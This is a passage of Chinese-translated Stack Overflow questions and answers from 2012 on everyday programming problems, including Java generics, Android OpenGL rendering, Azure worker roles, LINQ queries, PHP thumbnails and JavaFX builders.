interface A extends Base<String> {
    String get();
}

interface B extends Base<Integer> {
    Integer get();
}

interface AB extends A, B {
    ??
} 
```

当你去尝试实现 AB 时，如果可能的话，get() 方法会返回什么类型。在 Java 中，一个类中的两个方法不能具有相同的名称/参数但返回类型不同......因此，这是禁止的。

如果您确实需要一些类似于 Java 允许的功能，我会建议以下内容：

```
 abstract class C {
    A a;
    B b;
    String aGet() {
        return a.get();
    }

    Integer bGet() {
        return b.get();
    }
} 
```

或者，保留泛型：

```
abstract class C<K, T> {
    Base<K> a;
    Base<T> b;
    K getA() {
        return a.get();
    }

    T getB() {
        return b.get();
    }
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-04T10:25:38.257

泛型基本上只是编译时检查，所以 InterfaceA 和 InterfaceB 是相同的。

您所建议的一般解决方法很难提出，您可能需要更多地指定您的确切情况。但是你真的需要那个类来实现这两个，为什么不是两个不同的类呢？也许是嵌套类，甚至是匿名内部类？

# android - OpenGL ES 2.0 无法在 Android 4.0.3 上呈现

> ID：10446923
> 
> 赞同：3
> 
> 时间：2012-05-04T10:19:02.103
> 
> 标签：android, opengl-es, android-ndk, opengl-es-2.0

我正在为 Android 编写完全原生的 OpenGL ES 2.0 游戏引擎。以前我使用三星 Galaxy S (Android 2.3.3) 开发，现在使用三星 Galaxy S II (更新到 Android 4.0.3)。我没有在 Galaxy S II 上尝试引擎，但它仍然有 Android 2.3.3（硬件特定问题？）。

现在，引擎在 Android 2.3.3（在 Galaxy S 上测试）上运行和渲染良好，但在 Android 4.0.3（在 Galaxy S II 上测试）上无法渲染。问题与此类似：[OpenGL Renderer not working on Ice Cream Sandwich](https://stackoverflow.com/q/9456817)

除了渲染之外，其他一切在 4.0.3 上都没有问题，屏幕上什么也没有出现。我设法在 4.0.3 上渲染了一个三角形，但是从模型中提取的顶点无论有没有纹理都不会渲染（使用 glDrawElements()）。

我希望有一个简单的解决方案。
干杯

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-05T10:32:24.083

我应该早点检查 GL 错误。问题发生`glDrawElements()`在我使用的地方`GL_UNSIGNED_INT`（`GL_UNSIGNED_BYTE`并且`GL_UNSIGNED_SHORT`是唯一允许的值）。Android 2.3.3 似乎并不关心这一点。我将其更改为`GL_UNSIGNED_SHORT`，现在它可以完美运行。

# azure - WorkerRole.cs 的目的是什么

> ID：10446924
> 
> 赞同：1
> 
> 时间：2012-05-04T10:19:25.423
> 
> 标签：azure, azure-worker-roles

嗨，我创建了一个具有工作者角色的新天蓝色项目，并注意到一个类 WorkerRole.cs。我试图研究它的目的是什么，但是我找不到一个直接的答案。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-04T10:41:12.537

WorkerRole.cs 的目标是为您提供一个入口点，以便在 Worker Role 实例启动时执行“某事”。这可以是您正在启动的命令行应用程序、WCF 服务或 MySQL，......任何您想要的东西。

请注意，您需要编写代码来保持实例“活动”。如果您不这样做，它将在 Run 方法完成时重新启动。请查看以下问题以获取更多信息：[Using Thread.Sleep or Timer in Azure worker role in .NET?](https://stackoverflow.com/questions/9561746/using-thread-sleep-or-timer-in-azure-worker-role-in-net)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-07T01:50:08.007

以下是您可以用来了解 Windows Azure 工作者角色的内容：

1.  Windows Azure 是平台即服务，您可以在专用虚拟机中运行您的应用程序（超小型实例除外）
2.  Windows Azure 应用程序的应用程序架构支持 3 种不同类型的应用程序，称为 Web Role、Worker Role 和 VM Role，

    2.1。Web 角色被认为是一个应用程序，其中预先配置了 IIS 并为您的应用程序做好了准备。在大多数情况下，它是一个基于 Web 的应用程序，但如果您愿意，它可能不是，但 IIS 将始终存在。使用 IIS，您可以运行 ASP.NET 应用程序或 node.js 应用程序，您可以自行决定需要哪种应用程序。

    2.2\. Worker 角色被认为是不需要 IIS 的应用程序，无论您想在 Worker 角色上运行什么，C#、Java、PHP、Python 或其他任何东西都取决于您。它主要用于开源Web应用程序或作为后端执行操作且不需要Web前端的应用程序。

    2.3 VM 角色处于测试阶段，用于在用户部署的自定义 VHD 上运行。我们认为这是在以下解释中。

3.  所有这些角色实际上都是一个库，意味着它们编译为 DLL，当它们在 Windows Azure 上运行时，它们实际上需要一个主机进程来运行。对于 Web Role，宿主进程是 WaWebHost.exe 或 WaWebIIS.exe，对于 WorkerRole，宿主进程是 WaWorkerHost.exe。

4.  当这些宿主进程在 Windows Azure 中启动时，它们会寻找一个名为 E:__entrypoint.txt 的文件，该文件提供了角色 DLL 名称和位置，以便宿主进程找到并加载它。

5.  这些 Web 和 Worker 角色类派生自 RoleEntryPoint 基类，它扩展了 Web 和 Worker 角色在 Windows Azure 环境中运行所需的所有功能

6.  当您使用 Azure SDK 模板创建 Web 或辅助角色时，您将获得这些基本代码文件，其中 Web 和辅助角色类可以实现所需的功能。对于 Worker Role，调用 WorkerRole 在 WorkerRole.cs 中定义，对于 Web Role，它是 WebRole.cs。

7.  如果您决定添加特定于 Windows Azure 运行时的代码，即您将在此处添加的配置或某些设置，因为当角色将通过主机进程启动时，您在 WebRole.cs 或 WorkerRole.cs 中添加的代码将在 Windows Azure 运行时中执行语境。

# cordova - 在 Android 上的 Phonegap 中访问 Sencha javascript 文件

> ID：10446926
> 
> 赞同：2
> 
> 时间：2012-05-04T10:19:28.953
> 
> 标签：cordova, sencha-touch, extjs, sencha-touch-2

我能够在 Android Emulator 3.1 上使用 Phonegap 运行 Sencha Touch 应用程序。

但是，当涉及到 Android 平板电脑（三星 Galaxy，3.1）时，它无法加载应用程序。它在访问由 sencha 为 Store、Model、View 和 Controller 生成的 *.js 文件时出现错误。

错误是：

```
Failed loading 'app/store/xyz.js', please verify that the file exists
 Uncaught Error: [Ext.Loader] Failed loading 'app/store/xyz.js', please verify that the file exists at file:///android_asset/www/sencha-touch-all-debug.js:8010 
```

我正在使用 Sencha Touch 2.0.0 和 PhoneGap 1.7.0。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-06T12:04:34.093

Android v3.x 及更高版本上的 Webview 无法加载带参数的本地文件，请参阅问题[#17535](http://code.google.com/p/android/issues/detail?id=17535)了解详细信息，但简而言之，这将不起作用：

```
<a href="file:///android_assets/test.html?para=one>test</a> 
```

这个问题的严重后果是 Sencha Touch 2 和特别是[Ext.Loader](http://docs.sencha.com/touch/2-0/#!/api/Ext.Loader)和[Ext.Ajax](http://docs.sencha.com/touch/2-0/#!/api/Ext.Ajax)类无法加载 javascript 依赖项，因为每个 javascript 文件都添加了额外的 'timestamp' 参数（请参阅[disableCachingParam](http://docs.sencha.com/touch/2-0/#!/api/Ext.Loader-cfg-disableCachingParam)）。

要解决此问题，您需要禁用“disableCaching”选项：

```
Ext.Loader.setConfig({ enabled: true, disableCaching: false });
Ext.Ajax.setDisableCaching(false); 
```

另请参阅错误[#TOUCH-1463](http://www.sencha.com/forum/showthread.php?162322-Sencha-Touch-2-PhoneGap-are-not-working-on-Android-4)

# jquery - jQuery插件在按钮旁边放置一个弹出窗口？

> ID：10446927
> 
> 赞同：2
> 
> 时间：2012-05-04T10:19:32.347
> 
> 标签：jquery, plugins

有多个按钮，应该调用相同的弹出/下拉列表。是否有一个 jQuery 插件，它会在单击的按钮旁边放置一个当前隐藏的元素，同时考虑到屏幕限制（这样如果按钮位于页面底部，则弹出窗口位于其上方）？

我想把它放在底部，但如果没有足够的空间 - 移动它。与左/右相同，调整窗口大小。

# c# - Linq，选择值 + - 一个值

> ID：10446932
> 
> 赞同：0
> 
> 时间：2012-05-04T10:19:49.390
> 
> 标签：c#, linq

我需要在产品表上进行选择。该产品有一个名为 ZipCode 的列，我需要从特定邮政编码获取所有产品，以及高于和低于所选邮政编码的 5 个邮政编码

因此，如果我的邮政编码为 51235，我需要来自 5 个较高邮政编码和较低邮政编码的产品，这对 linq 是否可行？

希望有人可以帮助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T10:28:04.273

也许是这样的：

```
var zip = 51235;
context.Products.Where(p => p.ZipCode >= zip - 5 && p.ZipCode <= zip +5); 
```

或者像这样：

```
var zip = 51235;
var products = from p in context.Products
where p.ZipCode >= zip -5 && p.ZipCode <= zip + 5
select p; 
```

更新：

如果您想在一个语句中完成所有操作，您可以这样做：

```
 var products = Products.Where(p1 => 
                Products.Select(p2 => p2.ZipCode)
                        .Distinct()
                        .Where(p3 => p3 >= zipCode)
                        .Take(4)
                        .Union(
                            Products.Select(p4 => p4.ZipCode)
                            .Distinct()
                            .Where(p5 => p5 < zipCode)
                            .Take(3)
                        ).Contains(p1.ZipCode)
                ); 
```

但是将其拆分为不同的语句以使其更具可读性可能更容易。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-04T10:27:28.330

获取 zipcode-5 和 zipcode+5 之间的产品

```
container.Products.Where(w => (w.ZipCode > zipCode - 5) && (w.ZipCode < zipCode + 5)); 
```

要使产品的邮政编码完全等于邮政编码 +/- 5 和当前邮政编码。

```
container.Products.Where(w => (w.ZipCode == zipCode - 5) || (w.ZipCode == zipCode + 5) || (w.ZipCode == zipCode + 5)); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-04T10:35:39.820

您可以使用，

```
var collectionEqualToZipCode = SourceCollection.Where(source=> source.Zip == SelectedZip);

int lessZipCodesTaken = 0;
int greaterZipCodesCountTaken = 0;
var collectionlessthanOrGreaterthanZipCode = SourceCollection.TakeWhile(source => 
(source.Zip < SelectedZip && lessZipCodesTaken++ < 5) ||
(source.Zip > SelectedZip && greaterZipCodesCountTaken ++ < 5));
FinalCOllection.AddRange(collectionEqualToZipCode);
FinalCOllection.AddRange(collectionlessthanOrGreaterthanZipCode ); 
```

# java - 为 NetBeans 等元素构建自动对齐需要什么？

> ID：10446936
> 
> 赞同：2
> 
> 时间：2012-05-04T10:20:27.723
> 
> 标签：java, swing, user-interface, applet, layout-manager

目前我有一个java小程序工具供用户设计GUI。用户可以选择将哪些元素（TextBox、ComboBox、JTable 等）拖放到设计区域的顶部。元素可以移动、调整大小和更改属性。

我一直在努力做一件事：元素自动对齐

在 NetBeans 中，当用户在设计区域周围拖动元素时，它将对齐以与现有元素对齐（以及附加的标尺下划线以向用户显示它当前与该元素对齐）

知道如何在 Java 小程序中开发它吗？

# iphone - Iphone，始终将 Facebook 应用的受众设置为公开

> ID：10446937
> 
> 赞同：1
> 
> 时间：2012-05-04T10:20:28.397
> 
> 标签：iphone, ios, facebook, facebook-graph-api

我正在使用 Facebook 应用程序。当用户最初使用他的 Facebook id 登录时，他可以将受众设置为公开、私人和只有我。我的问题是，是否可以始终以编程方式将观众设置为公开？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-05-02T20:04:30.280

**更新**正确答案：转到*App Details* => *Configure App Center Permissions*并在此处更改*Default Activity Privacy*。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-04T10:35:56.710

是的，它是在 Facebook 上完成的。转到[https://developers.facebook.com/apps](https://developers.facebook.com/apps) => your app => Settings => Auth Dialog 并`Default Activity Privacy`在那里更改。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-03-13T15:36:46.450

可能你需要使用 -

```
 FBSDKLoginManager *loginManager = [[FBSDKLoginManager alloc] init];
        loginManager.defaultAudience = FBSDKDefaultAudienceEveryone; 
```

# php - 图像裁剪和拇指创建

> ID：10446938
> 
> 赞同：1
> 
> 时间：2012-05-04T10:20:30.253
> 
> 标签：php, image, web

我需要帮助一个朋友制作自己的艺术画廊。我已经完成了所有工作，但我需要一个工具/插件/脚本来让他独立于我上传他自己的图像。我的画廊需要两张图片：一张按一定比例裁剪的（所以我需要他在上传页面中自己裁剪）和一张拇指（我希望自动完成）。

你知道一个简单的方法来做到这一点吗？你会怎么做？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T10:46:22.657

您只需要 GD 库，函数 imagecopyresampled 将适合您。PHP 手册有很好的缩略图创建示例代码[http://php.net/manual/en/function.imagecopyresampled.php](http://php.net/manual/en/function.imagecopyresampled.php) 您只需要为不同的文件格式创建例外

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-04T11:14:06.343

```
function create_jpeg_thumbnail($thumbImageName,$imgSrc,$thumbDirectory,$thumbnail_width,$thumbnail_height) { //$imgSrc is a FILE - Returns an image resource.
        $thumbDirectory = trim($thumbDirectory);
        $imageSourceExploded = explode('/', $imgSrc);
        $imageName = $imageSourceExploded[count($imageSourceExploded)-1];
        $imageDirectory = str_replace($imageName, '', $imgSrc);
        $filetype = explode('.',$imageName);
        $filetype = strtolower($filetype[count($filetype)-1]);

        //getting the image dimensions 
        list($width_orig, $height_orig) = getimagesize($imgSrc);  

        //$myImage = imagecreatefromjpeg($imgSrc);
        if ($filetype == 'jpg') {
            $myImage = imagecreatefromjpeg("$imageDirectory/$imageName");
        } else
        if ($filetype == 'jpeg') {
            $myImage = imagecreatefromjpeg("$imageDirectory/$imageName");
        } else
        if ($filetype == 'png') {
            $myImage = imagecreatefrompng("$imageDirectory/$imageName");
        } else
        if ($filetype == 'gif') {
            $myImage = imagecreatefromgif("$imageDirectory/$imageName");
        }

        $ratio_orig = $width_orig/$height_orig;

        if ($thumbnail_width/$thumbnail_height > $ratio_orig) {
           $new_height = $thumbnail_width/$ratio_orig;
           $new_width = $thumbnail_width;
        } else {
           $new_width = $thumbnail_height*$ratio_orig;
           $new_height = $thumbnail_height;
        }

        $x_mid = $new_width/2;  //horizontal middle
        $y_mid = $new_height/2; //vertical middle

        $process = imagecreatetruecolor(round($new_width), round($new_height));

        imagecopyresampled($process, $myImage, 0, 0, 0, 0, $new_width, $new_height, $width_orig, $height_orig);
        $thumb = imagecreatetruecolor($thumbnail_width, $thumbnail_height);
        imagecopyresampled($thumb, $process, 0, 0, 0, 0, $thumbnail_width, $thumbnail_height, $thumbnail_width, $thumbnail_height);
        //$thumbImageName = 'thumb_'.get_random_no().'.jpeg';
        $destination = $thumbDirectory=='' ? $thumbImageName : $thumbDirectory."/".$thumbImageName;
        imagejpeg($thumb, $destination, 100);
        return $thumbImageName;
    } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-04T10:21:55.933

如果您不打算开始有大量流量 - 查看[http://phpthumb.sourceforge.net/](http://phpthumb.sourceforge.net/)可以即时创建调整大小的图像。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-04T10:37:27.153

我个人在我的所有项目中都使用它 - [http://www.verot.net/php_class_upload.htm](http://www.verot.net/php_class_upload.htm) 与上传文件和系统上已有的文件完美配合。

可以做很多事情以多种方式转换，调整大小和处理上传的图像，应用效果，添加标签，水印和反射以及其他图像编辑功能。

易于使用。

# javascript - 如何使用 JQuery Mobile 跨页面同步切换选择？

> ID：10446942
> 
> 赞同：0
> 
> 时间：2012-05-04T10:20:40.440
> 
> 标签：javascript, jquery-mobile

我需要一个多页 html，每个页面都包含一个相同的切换。当用户更改一个页面上的切换时，其他页面上的所有切换都应更改（或至少在加载其他页面时更改）。

我创建了一个 Fiddle 来说明一个简单的场景，其中包含一个两页示例和每个页面上的相同切换。我希望能够通过切换第 1 页上的切换来更改第 2 页上的切换 [http://jsfiddle.net/vSr99/](http://jsfiddle.net/vSr99/)

我尝试了多种方法，是的，在尝试使用 javascript 操作后包括刷新，但甚至没有接近，这无疑是由于我的编程挑战性质：-/

如果有人可以提出一个简单的解决方案，我将不胜感激！

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-05T06:27:43.487

单击按钮时尝试设置全局属性并将其存储在 $('html') 上，如下所示：

```
 $('html'). attr('toggleIs',true); 
```

*然后您可以在pagebforeshow*上检查这一点，并根据按钮状态将切换状态添加到所有被拉入视图的新页面上的按钮。

**编辑**
这是一个[jsfiddle](http://jsfiddle.net/vSr99/5/)（忽略第一个警报）；

这是html：

```
$(document).on('change', '.your_select', function(){
  // set
  if( $(this).find('option:selected').val() == "on" ){
       $('html').data('toggle', 'on');
       } else {
       $('html').data('toggle', 'off');
       }
  });

$(document).on('pagebeforeshow', '.ui-page', function(){

  var that = $(this).find('.your_select');
  // clear
  that.find('option').removeAttr('selected');
  // reset
  if($('html').data('toggle') == "on" ){
      alert("should be on")
      that.find('select option[value="on"]').attr('selected', 'selected')
      } else {
        alert("should be off")          
        that.find('option[value="off"]').attr('selected', 'selected')
        }
 // refresh slider
 ... 
 }); 
```

请注意：

*   我花了一段时间才看到你在哪里使用 jquery 1.6.4，所以我的绑定不起作用。如果要保留，则需要使用*live*进行绑定以捕获被拉入的页面。
*   我给所有的滑块上了一堂课，把它们放在一起
*   我无法让 JQM 滑块（'refresh'）在滑块或任何父元素上工作......你必须自己弄清楚，但同步正在工作:-)

# c# - 尝试安装使用 C# 创建的 Windows 服务应用程序

> ID：10446943
> 
> 赞同：6
> 
> 时间：2012-05-04T10:20:43.593
> 
> 标签：c#, .net, windows-services

我正在尝试安装使用以下命令制作的 Windows 服务：

> C:\$(MyFiles)\Projects\Win Service\c#\filechecker\filechecker\bin\Debug>InstallU til.exe filechecker.exe

但我收到以下消息：

> 运行事务安装。
> 
> 开始安装的安装阶段。查看 C:\$(MyFiles)\Projects\Win Service\c#\filechecker\filechecker\bin\Debug\filechecker.exe 程序集进度的日志文件内容。该文件位于 C:\$(MyFiles)\Projects\Win Service\c#\filechecker\filechecker\bin\Debug\filechecker.InstallLog。
> 
> 安装阶段发生异常。System.ArgumentException：必须为源指定值。
> 
> 安装的回滚阶段即将开始。查看 C:\$(MyFiles)\Projects\Win Service\c#\filechecker\filechecker\bin\Debug\filechecker.exe 程序集进度的日志文件内容。该文件位于 C:\$(MyFiles)\Projects\Win Service\c#\filechecker\filechecker\bin\Debug\filechecker.InstallLog。
> 
> 回滚阶段成功完成。
> 
> 事务安装已完成。
> 
> 运行事务安装。
> 
> 开始安装的安装阶段。查看 C:\$(MyFiles)\Projects\Win Service\c#\filechecker\filechecker\bin\Debug\filechecker.exe 程序集进度的日志文件内容。该文件位于 C:\$(MyFiles)\Projects\Win Service\c#\filechecker\filechecker\bin\Debug\filechecker.InstallLog。
> 
> 安装阶段发生异常。System.ArgumentException：必须为源指定值。
> 
> 安装的回滚阶段即将开始。查看 C:\$(MyFiles)\Projects\Win Service\c#\filechecker\filechecker\bin\Debug\filechecker.exe 程序集进度的日志文件内容。该文件位于 C:\$(MyFiles)\Projects\Win Service\c#\filechecker\filechecker\bin\Debug\filechecker.InstallLog。
> 
> 回滚阶段成功完成。
> 
> 事务安装已完成。

我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-05-04T10:44:52.503

[`ServiceInstaller`](http://msdn.microsoft.com/en-us/library/system.serviceprocess.serviceinstaller.aspx)总是¹创建一个事件日志源，并将`Source`名称设置为[`ServiceName`](http://msdn.microsoft.com/en-us/library/system.serviceprocess.serviceinstaller.servicename.aspx). 该错误向我表明您没有`ServiceName`在您的`ServiceInstaller`实例上设置（尽管我希望有一个更好的错误）。

* * *

¹除非您在实例化后手动迭代其安装程序集合并将其删除。您还必须确保关闭所有自动日志记录和/或[`EventLogInstaller`](http://msdn.microsoft.com/en-us/library/system.diagnostics.eventloginstaller.aspx)使用相同的源名称手动添加您自己的 - 如果您希望服务中的所有日志记录（包括自动日志记录）都转到某个地方，这可能很有用*除了*应用程序事件日志。

# mysql - 如何在nodejs node-mysql中关闭与MYSQL的连接

> ID：10446944
> 
> 赞同：1
> 
> 时间：2012-05-04T10:20:44.793
> 
> 标签：mysql, node.js

似乎有时与 MYSQL 的连接未关闭成功。我正在使用 nodejs 和 node-mysql 库。

```
client = mysql.createClient({ user: 'root', password: 'pass' });
client.query('USE db');
client.query( 'SELECT a FROM b ORDER BY c ASC', function selectCb(err, results, fields) {
  client.end();
  if (err) throw err;
  ....       
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-06T19:31:30.220

希望有帮助！

```
client.end(function(err) {
    // do what you want after the connection if closed :)
}); 
```

您也可以查看此链接：[https](https://github.com/felixge/node-mysql#pooling-connections) ://github.com/felixge/node-mysql#pooling-connections `

# java - AndEngine GLES 2 - 黑屏，没有错误

> ID：10446945
> 
> 赞同：5
> 
> 时间：2012-05-04T10:20:45.357
> 
> 标签：java, android, andengine, andengine-gles-2

我正在使用**AndEngine GLES 2**为 Android 编写游戏。一切正常——我有一个背景图像，有四处移动的精灵，甚至还有一些音乐——直到最近我尝试了一些新的东西（我希望能够在两个不同的场景之间切换），当显示器变黑时。

我仍然可以执行游戏并且没有显示错误。显示了我在游戏中制作的所有日志条目，甚至音乐也在播放，所以我知道游戏“正常”运行，但我看不到任何图像。没有什么。全黑。

所以我想，把所有的东西都改回这个“错误”出现之前，就可以了。但是还是黑屏。

我什至尝试将除背景图像之外的所有内容都注释掉 - 什么都没有。

现在，如果要问的不是太多，任何人都可以查看这段简短的代码并告诉我那里出了什么问题吗？

这是我使用的**变量：**

```
private SmoothCamera camera;
private BitmapTextureAtlas bitmapTextureAtlas;  
private Scene scene;
private Sprite background; 
```

我从未更改过的**EngineOptions**，所以它们应该没问题。

```
@Override
public EngineOptions onCreateEngineOptions() {
    float positionX = 80f; // horizontal (x) position of the camera
    float positionY = 280f; // vertical (y) position of the camera
    float velocityX = 200f; // velocity of the horizontal camera movement
    float velocityY = 200f; // velocity of the vertical camera movement
    float zoomFactor = 1f; // the camera's zoom Factor (standard := 1)
    this.camera = new SmoothCamera(positionX, positionY, this.getWindowManager().getDefaultDisplay().getWidth(), this.getWindowManager().getDefaultDisplay().getHeight(), velocityX, velocityY, zoomFactor);
    EngineOptions options = new EngineOptions(true, ScreenOrientation.LANDSCAPE_SENSOR, new RatioResolutionPolicy(this.camera.getWidth(), this.camera.getHeight()), this.camera);
    return options;
} 
```

在这里，我创建**TextureAtlas**并加载**背景图像**。

```
@Override
protected void onCreateResources() {
    // create the TextureAtlas
    BitmapTextureAtlasTextureRegionFactory.setAssetBasePath("gfx/");
    this.bitmapTextureAtlas = new BitmapTextureAtlas(this.getTextureManager(), 1024, 1600, TextureOptions.NEAREST);

    // background
    this.background = new Sprite(0, 0, BitmapTextureAtlasTextureRegionFactory.createTiledFromAsset(this.bitmapTextureAtlas, this, "background.png", 0, 0, 1, 1), this.getVertexBufferObjectManager());
    this.mEngine.getTextureManager().loadTexture(this.bitmapTextureAtlas);
} 
```

最后，**场景**被实例化并附加背景。

```
@Override
protected Scene onCreateScene() {
    this.scene = new Scene();
    this.scene.attachChild(this.background);        
    return this.scene;
} 
```

现在为什么这个小活动不显示？我忘了：它是一个 SimpleBaseGameActivity。

好吧，由于 AndEngine GLES2 没有在模拟器上运行，我必须使用我的手机（三星 Galaxy GIO）并且无法在另一台机器上测试该应用程序。

有没有人偶然发现类似的问题？非常感谢您的任何帮助，并感谢您的宝贵时间！

*   **克里斯托夫**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-23T12:06:04.483

我认为问题出在这里：

```
this.bitmapTextureAtlas = new BitmapTextureAtlas(this.getTextureManager(), 1024, 1600, TextureOptions.NEAREST); 
```

Atlas的尺寸应该是2的幂。

# ios - AFNetworking 和全球存储 Cookie

> ID：10446951
> 
> 赞同：0
> 
> 时间：2012-05-04T10:21:14.460
> 
> 标签：ios, networking, cookies, afnetworking

我有一个使用 AFNetworking 进行联网的应用程序。我正在与之交谈的服务使用基本身份验证进行身份验证。因此，在我的客户端中，我使用 setAuthorizationHeaderWithUsername:password: 方法来设置用户名和密码，一切正常。

现在我应该在应用程序中添加一个“在浏览器中打开”按钮。但是当我调用 URL 时，我 iPhone/iPad 上的 Safari 会希望用户再次登录。

有什么解决方案可以设置登录到默认 cookie 存储时获得的 cookie？

到目前为止，我尝试的是：

```
NSString* authorization = [client defaultValueForHeader:@"Authorization"];
NSMutableDictionary *cookieProperties = [NSMutableDictionary dictionary];
[cookieProperties setObject:@"myCookie" forKey:NSHTTPCookieName];
[cookieProperties setObject:authorization forKey:NSHTTPCookieValue];
[cookieProperties setObject:@"www.the.server" forKey:NSHTTPCookieDomain];
[cookieProperties setObject:@"www.the.server" forKey:NSHTTPCookieOriginURL];
[cookieProperties setObject:@"/" forKey:NSHTTPCookiePath];
[cookieProperties setObject:@"0" forKey:NSHTTPCookieVersion];             
[cookieProperties setObject:[[NSDate date] dateByAddingTimeInterval:2629743] forKey:NSHTTPCookieExpires];

NSHTTPCookie* cookie = [[NSHTTPCookie alloc] initWithProperties:cookieProperties];
[[NSHTTPCookieStorage sharedHTTPCookieStorage] setCookie:cookie];
[[NSHTTPCookieStorage sharedHTTPCookieStorage] setCookieAcceptPolicy:NSHTTPCookieAcceptPolicyAlways]; 
```

这给了我一个 cookie，但是在我的 iPhone/iPad 上的 Safari 中打开 URL 时，它不起作用

AFNetworking 中是否有任何 API 调用可以处理该问题？或者有没有办法我可以自己手动完成？

感谢您的帮助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T02:26:18.093

不，每个应用程序都有自己的沙盒。无法与 Safari 共享 cookie。

# jquery - 使用 Jquery 和 MVC 渲染局部视图

> ID：10446960
> 
> 赞同：1
> 
> 时间：2012-05-04T10:21:57.337
> 
> 标签：jquery, asp.net-mvc

在 MVC 应用程序中的我的 jquery 文件上，当用户单击该页面中的按钮时，我需要在标题中呈现用户控件。同时我需要使用 jquery 将参数传递给局部视图。下面给出的代码示例。

```
<html lang="en" <% = ClientStyle.GetMicrodataNamespaces() %>>
    <% Html.RenderPartial("Slideshows/Head"); %>

    <body class="ss-msnbc">
        <div id="header">
            <div class="container">
                <% Html.RenderPartial("Slideshows/Logo"); %>
                <div id="slideshow-title">
                    <h2><%=Model.Title%></h2>
                </div>
                <ul id="tabs">
                    <% Html.RenderPartialForEach("Slideshows/TabNavigator", Model.TabNavigators); %>
                </ul>
            </div>
        </div>
        <div id="bantop">
            <div class="container">
                <div id="slide-nav">
                    <ul id="next-prev">                
                        **<li class="btn prev-dis"><a id="prevslide" href="#" title="Previous">&nbsp;</a></li>
                        <li class="btn next-dis"><a id="nextslide" href="#" title="Next">&nbsp;</a></li>**
                    </ul>
                    <% foreach(var slideNavigator in Model.SlideNavigators) { %>
                        <ul class="slide-numbers" style="display:none;" id="navigator_<%=slideNavigator.TabIndex%>">
                            <% Html.RenderPartial("Slideshows/SlideNavigator", slideNavigator); %>
                        </ul>
                    <% } %>
                </div>
                    <% Html.RenderPartial("Slideshows/RelatedLinks", Model); %>
            </div>
        </div>
</body>
<html> 
```

如果我单击 Prevslide 按钮，它应该呈现 slideshows\Head 用户控件。这必须在 Jquery 中实现。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T10:26:29.240

您可以使用[JQuery get](http://api.jquery.com/jQuery.get/)，

```
$.get('controler/action',{parameter1:value1,parameter2:value2},function(data){
 $('#header').html(data);
}); 
```

# cordova - WebOS 的 LocalNotification / Reminder PhoneGap 插件？

> ID：10446965
> 
> 赞同：1
> 
> 时间：2012-05-04T10:22:15.513
> 
> 标签：cordova, webos

是否有适用于 WebOS 的 LocalNotification PhoneGap/Cordova 插件？

即使 App 没有运行，它也可以在指定的时间发送提醒通知。

```
plugins.localNotification.add({
        date : new Date(2012,6,10),
        message : "Phonegap - Local Notification \r\n -- For WebOS",
        ticker : "This is a sample ticker text",
        repeatDaily : false,
        id : 4
}); 
```

它作为[iPhone](http://www.drewdahlman.com/meusLabs/?p=84)的 PhoneGap 插件存在，并已移植到[Android](https://github.com/phonegap/phonegap-plugins/tree/master/Android/LocalNotification)。

如果不存在 PhoneGap 插件，我需要做什么来构建一个？我可以使用 `Mojo.Controller.getAppController().showBanner` 和[警报](https://developer.palm.com/content/content/api/reference/services/alarms.html)来创建一些 Javascript 函数，例如：

*   添加警报
*   取消警报
*   取消所有警报
*   本地通知
*   ...

还有其他方法可以做到这一点或示例代码可以为 webOS 完成类似的事情吗？

我是一个相当有经验的程序员，但对 webOS 和 Mojo 框架是全新的（2 天）。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-05T03:01:31.417

以下是在 Mojo 应用程序中设置警报的一些信息：

[http://webos101.com/Alarms](http://webos101.com/Alarms)

您还需要查看有关多阶段应用程序的信息。我不确定它可以多么容易地转换为一个简单的插件，但可以轻松创建功能。

# generics - JavaFX 构建器/Java 泛型

> ID：10446967
> 
> 赞同：2
> 
> 时间：2012-05-04T10:22:27.603
> 
> 标签：generics, javafx-2

我想重新使用一个 Builder 实例来创建几个控件，但是我遇到了我不理解的编译错误。我认为它们是由于我没有正确理解泛型造成的。任何人都可以帮忙吗？

```
ButtonBuilder builder = ButtonBuilder.create().minHeight(40.0).minWidth(40.0);
Button button1 = builder.onAction(clickHandler).build(); // Error
Button button2 = ButtonBuilder.create().minHeight(40.0).minWidth(40.0).onAction(clickHandler).build(); //OK 
```

其中 clickHandler 是一个`EventHandler<ActionEvent>`

我得到的错误是

```
error: cannot find symbol
    Button button1 = builder.onAction(clickHandler).build();
                                                   ^
symbol:   method build()
location: class ButtonBaseBuilder 
```

ButtonBaseBuilder 实现了 Builder 所以它应该有一个 build() 方法，不是吗？此外，如果我将所有内容一起运行（如在 button2 中），那就没问题了。

这是在 JDK 7.0u4 和 JavaFX SDK 2.1 上

在此先感谢，皮特

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-04T10:39:07.720

`ButtonBaseBuilder`没有`build`方法。`ButtonBuilder`，其中`extends ButtonBaseBuilder`，有一个是因为它`implements Builder<Button>`。

这应该有效：

```
Button button1 = ((ButtonBuilder) builder.onAction(clickHandler)).build(); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-04T11:00:51.923

您需要传递 ButtonBuilder 通用参数才能以这种方式使用构建器：

```
 ButtonBuilder<? extends ButtonBuilder> builder =
